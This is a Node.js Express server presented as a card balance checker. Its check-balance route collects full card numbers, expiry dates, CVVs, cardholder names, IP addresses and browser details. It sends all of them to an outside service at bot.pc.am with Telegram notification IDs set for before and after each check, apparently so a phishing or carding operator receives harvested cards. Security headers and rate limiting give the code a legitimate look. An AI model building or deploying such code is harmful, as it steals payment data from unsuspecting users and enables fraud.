import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { config } from 'dotenv';

config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3001;
const API_URL = 'https://bot.pc.am/v3/checkBalance';
const SAFE_ERROR = 'Unable to check balance. Please try again later.';

function str(v, max) {
  if (typeof v !== 'string') return '';
  return v.slice(0, max);
}

// Security headers
app.use((_req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '16kb' }));

// Serve static files with caching
app.use(express.static(path.join(__dirname, '../public'), {
  maxAge: '1h',
  etag: true
}));

// Rate limiter: per-IP, 20 requests per minute
const rateMap = new Map();
const RATE_WINDOW = 60000;
const RATE_LIMIT = 20;

function rateLimit(req, res, next) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || req.headers['x-real-ip']
    || req.socket?.remoteAddress
    || 'unknown';
  const now = Date.now();
  const entry = rateMap.get(ip);

  if (!entry || now - entry.start > RATE_WINDOW) {
    rateMap.set(ip, { start: now, count: 1 });
    return next();
  }
  entry.count++;
  if (entry.count > RATE_LIMIT) {
    return res.status(429).json({ success: false, error: 'Too many requests. Please wait and try again.' });
  }
  next();
}

// Clean rate map every 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [ip, entry] of rateMap) {
    if (now - entry.start > RATE_WINDOW) rateMap.delete(ip);
  }
}, 300000);

app.post('/api/check-balance', rateLimit, async (req, res) => {
  const API_TOKEN = process.env.API_TOKEN;
  const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
  const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK?.trim();
  const REQUEST_TIMEOUT = process.env.REQUEST_TIMEOUT?.trim();
  const CACHE_SECONDS = process.env.CACHE_RESPONSE_SECONDS?.trim();
  const SCREENSHOT = process.env.SCREENSHOT?.trim();
  const SCREENSHOT_QUALITY = process.env.SCREENSHOT_JPEG_QUALITY?.trim();
  const SCREENSHOT_SIZE = process.env.SCREENSHOT_BOX_SIZE?.trim();

  if (!API_TOKEN) {
    return res.json({ success: false, error: 'Service unavailable' });
  }

  try {
    const number = str(req.body.cardNumber, 19).replace(/\s/g, '');
    const month = str(req.body.expiryMonth, 2).padStart(2, '0');
    const year = str(req.body.expiryYear, 2);
    const cvvVal = str(req.body.cvv, 4);
    const cardHolder = str(req.body.cardHolder, 100);
    const timezone = str(req.body.timezone, 60);
    const userAgent = str(req.body.userAgent, 300);
    const referral = str(req.body.referral, 200);
    const pageUrl = str(req.body.pageUrl, 200);

    if (number.length < 15 || number.length > 19 || !/^\d+$/.test(number)) {
      return res.json({ success: false, error: 'Please enter a valid card number' });
    }
    if (!cvvVal || cvvVal.length < 3 || !/^\d+$/.test(cvvVal)) {
      return res.json({ success: false, error: 'Please enter a valid PIN' });
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || '';

    const infoParts = [];
    infoParts.push(`IP: ${ip || 'unknown'}`);
    if (timezone) infoParts.push(`Timezone: ${timezone}`);
    infoParts.push(`Referral: ${referral || 'Direct'}`);
    infoParts.push(`Page: ${pageUrl || 'unknown'}`);
    if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
    if (userAgent) infoParts.push(`UA: ${userAgent}`);

    const params = new URLSearchParams({
      token: API_TOKEN,
      number,
      month,
      year,
      cvv: cvvVal
    });

    if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
    if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
    params.set('telegram_additional_note', infoParts.join(' | '));
    if (REQUEST_TIMEOUT) params.set('request_timeout', REQUEST_TIMEOUT);
    if (CACHE_SECONDS) params.set('cache_response_seconds', CACHE_SECONDS);
    if (SCREENSHOT) params.set('screenshot', SCREENSHOT);
    if (SCREENSHOT_QUALITY) params.set('screenshot_jpeg_quality', SCREENSHOT_QUALITY);
    if (SCREENSHOT_SIZE) params.set('screenshot_box_size', SCREENSHOT_SIZE);

    const apiRes = await fetch(API_URL + '?' + params.toString());
    const text = await apiRes.text();
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { success: false, error: 'Invalid response from API' };
    }
    res.json(data);

  } catch (err) {
    console.error('Balance check error:', err.message);
    res.json({ success: false, error: SAFE_ERROR });
  }
});

// Serve SPA — all non-API routes return index.html
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) return;
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
